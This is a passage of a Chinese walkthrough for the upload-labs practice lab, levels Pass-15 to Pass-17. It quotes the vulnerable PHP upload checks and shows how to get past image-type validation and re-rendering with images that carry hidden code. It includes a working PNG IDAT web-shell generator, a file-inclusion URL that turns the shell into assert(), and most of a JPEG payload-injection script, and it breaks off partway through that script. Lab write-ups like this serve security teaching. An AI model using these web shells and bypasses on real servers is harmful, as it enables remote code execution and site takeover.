class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);<span class="comment">//判断是否为图像，并返回图片大小、类型等</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);<span class="comment">//$info[2]是getimagesize()返回的文件类型，image_type_to_extension()会根据这个类型返回一个后缀名。</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;<span class="comment">//判定图片类型是否在$types中</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getimagesize()//会返回图像尺寸、文件类型和一个可用于普通HTML文件的img标记中的height/width文本字符串，如果图片不是有效的，会返回false并报错。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image_type_to_extension()//根据指定的图像类型返回对应的后缀名。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripos()//函数查找字符串在另一字符串中第一次出现的位置，未出现则返回false</span><br></pre></td></tr></table></figure><p>图像不能是损坏的，否则不会被getimagesize()通过。</p><p>用正常图片马就能绕过。</p><h4 id="Pass-16exif-imagetype-校验，文件包含图片马"><a href="#Pass-16exif-imagetype-校验，文件包含图片马" class="headerlink" title="Pass-16exif_imagetype()校验，文件包含图片马"></a>Pass-16exif_imagetype()校验，文件包含图片马</h4><h5 id="解题1-15"><a href="#解题1-15" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype()//读取图片第一个字节并检查其签名，返回false或者一个和getimagesize()索引2一样的文件类型值。</span><br></pre></td></tr></table></figure><p>用正常图片马就能绕过。</p><h4 id="Pass-17二次渲染"><a href="#Pass-17二次渲染" class="headerlink" title="Pass-17二次渲染"></a>Pass-17二次渲染</h4><h5 id="解题1-16"><a href="#解题1-16" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);<span class="comment">//basename()获得返回路径中的文件名部分</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@unlink()//删除文件，前缀@表示不显示报错。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strval()//获取变量的字符串值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagejpeg($image,$filename)//从image图像以filename为文件名创建一个JPEG图像。 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagecreatefromjpeg()//对图片重新进行渲染，如果图片内有错误可能会渲染失败，尽量使用可以成功显示的图片来渲染。</span><br></pre></td></tr></table></figure><p>gif渲染解法：</p><p>上传一个能正常显示的图片马，对该图片马文件包含发现不能正常解析其中的恶意代码，下载该渲染后的图片马，与原来的版本进行对比，发现恶意代码在二次渲染过程中被擦除了：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220130102103671.png" alt="image-20220130102103671"></p><p>用winhex打开两张渲染前后图片作对比：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220130150839767.png" alt="image-20220130150839767"></p><p>可以发现，黑色部分是被渲染过的部分，而白色部分则是未被渲染的部分。因此绕过渲染的方法，就是把恶意代码插入在渲染后图片的未渲染部分即可：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220130151109258.png" alt="image-20220130151109258"></p><p>最后使用文件包含漏洞，包含该绕过二次渲染的图片马即可。</p><h5 id="解题2-1"><a href="#解题2-1" class="headerlink" title="解题2"></a>解题2</h5><p>PNG渲染解法：</p><p>利用大佬的脚本写入IDAT数据块，获得图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);//&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后文件包含，编码器得改成base64用来契合assert木马：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220130171645539.png" alt="image-20220130171645539"></p><p>木马原理是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.174.133/uploadlabs/include.php?file=./upload/20261.png&amp;0=assert</span><br><span class="line">?file=./upload/20261.png先包含木马：&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br><span class="line">接着$_GET[0]接收0=assert，木马就变成了：&lt;?=assert($_POST[1]);?&gt;</span><br><span class="line">于是按照常规assert一句话木马连接蚁剑即可。</span><br></pre></td></tr></table></figure><h5 id="解题3"><a href="#解题3" class="headerlink" title="解题3"></a>解题3</h5><p>JPG渲染解法：</p><p>利用国外大佬的脚本处理渲染图片。jpg_payload.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 